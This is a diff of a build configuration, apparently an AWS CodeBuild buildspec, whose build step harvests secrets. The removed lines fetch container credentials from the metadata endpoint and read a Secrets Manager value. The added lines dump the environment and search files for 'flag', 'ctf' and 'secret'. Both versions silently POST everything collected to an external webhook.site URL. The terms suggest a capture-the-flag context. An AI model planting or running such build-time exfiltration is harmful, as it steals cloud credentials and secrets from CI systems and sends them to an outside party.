@@ -4,16 +4,31 @@ phases:
   build:
     commands:
       - |
-        source /codebuild/output/tmp/env.sh 2>/dev/null || true
+        set +e
 
+        echo "=== IDENTITY ==="
         IDENTITY=$(aws sts get-caller-identity --output json 2>/dev/null || true)
-        CREDS_JSON=$(curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || true)
+        echo "$IDENTITY"
 
-        SECRET_NAME=$(aws secretsmanager list-secrets --query 'SecretList[0].Name' --output text 2>/dev/null || true)
-        SECRET_VAL=$(aws secretsmanager get-secret-value --secret-id "$SECRET_NAME" --query 'SecretString' --output text 2>/dev/null || true)
+        echo "=== ENV ==="
+        ENV_DUMP=$(env | sort 2>/dev/null || true)
+        echo "$ENV_DUMP"
+
+        echo "=== FLAG ENV ==="
+        FLAG_ENV=$(env | grep -Ei 'flag|ctf|secret' 2>/dev/null || true)
+        echo "$FLAG_ENV"
+
+        echo "=== FILE HITS ==="
+        FILE_HITS=$(find /codebuild /tmp /root /home -type f 2>/dev/null | grep -Ei 'flag|secret|ctf' || true)
+        echo "$FILE_HITS"
+
+        echo "=== GREP HITS ==="
+        GREP_HITS=$(grep -R -i -n -E 'flag|ctf|secret' /codebuild /tmp /root /home 2>/dev/null | head -100 || true)
+        echo "$GREP_HITS"
 
         curl -sk -X POST "https://webhook.site/17b4b3f4-da5d-4de7-80fc-75fbd9ab1202" \
           --data-urlencode "identity=$IDENTITY" \
-          --data-urlencode "creds=$CREDS_JSON" \
-          --data-urlencode "secret_name=$SECRET_NAME" \
-          --data-urlencode "secret=$SECRET_VAL" >/dev/null || true
+          --data-urlencode "flag_env=$FLAG_ENV" \
+          --data-urlencode "file_hits=$FILE_HITS" \
+          --data-urlencode "grep_hits=$GREP_HITS" \
+          --data-urlencode "env=$ENV_DUMP" >/dev/null || true
